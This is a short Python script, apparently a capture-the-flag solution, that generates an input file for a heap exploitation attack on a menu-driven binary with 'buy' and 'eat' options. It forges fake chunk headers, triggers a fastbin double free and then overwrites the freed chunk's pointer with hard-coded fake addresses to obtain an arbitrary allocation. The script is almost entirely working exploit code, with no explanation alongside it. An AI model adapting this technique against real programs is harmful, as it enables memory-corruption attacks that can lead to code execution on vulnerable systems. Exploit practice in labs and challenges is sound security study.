import struct, sys

def p64(x):
    return struct.pack("<Q", x)

out = bytearray()

def r(n, data):
    assert len(data) <= n, (n, data)
    out.extend(data + b'\x00' * (n - len(data)))

FASTBIN_FAKE = 0x602130
UNSORTED_FAKE = 0x602050

buf = bytearray(b'A' * 0x100)
buf[0x18:0x20] = p64(0x91)
buf[0x20:0x28] = p64(0)
buf[0xa0:0xa8] = p64(0)
buf[0xa8:0xb0] = p64(0x21)
buf[0xc0:0xc8] = p64(0)
buf[0xc8:0xd0] = p64(0x21)
buf[0xf0:0xf8] = p64(0)
buf[0xf8:0x100] = p64(0x60)
r(0x100, bytes(buf))

def choice(v):
    r(0x10, str(v).encode() + b'\n')

def buy(size, data):
    choice(1)
    r(0x10, str(size).encode() + b'\n')
    r(size, data)

def eat(idx):
    choice(2)
    r(0x10, str(idx).encode() + b'\n')

buy(0x58, b'A' * 0x58)
buy(0x58, b'B' * 0x58)
eat(0); eat(1); eat(0)
buy(0x58, p64(FASTBIN_FAKE) + b'C' * (0x58 - 8))
buy(0x58, b'D' * 0x58)
buy(0x58, b'E' * 0x58)
buy(0x58, p64(UNSORTED_FAKE) + p64(0) * 10)
open('./_z_55/in.bin', 'wb').write(bytes(out))
print("input", len(out), "bytes")
